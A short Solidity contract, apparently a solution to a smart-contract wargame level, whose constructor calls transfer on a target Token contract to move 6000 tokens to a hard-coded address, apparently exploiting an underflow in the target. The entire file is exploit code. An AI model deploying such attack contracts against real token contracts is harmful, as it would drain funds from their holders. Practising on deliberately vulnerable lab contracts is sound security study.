// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Token} from "./Token.sol";

contract TokenAttack {

    constructor (address _Target) public {
        Token(_Target).transfer(0xCD08e311fddE39804dc6cEcC2Ea6b498C2A39f81, 6000);
    }
}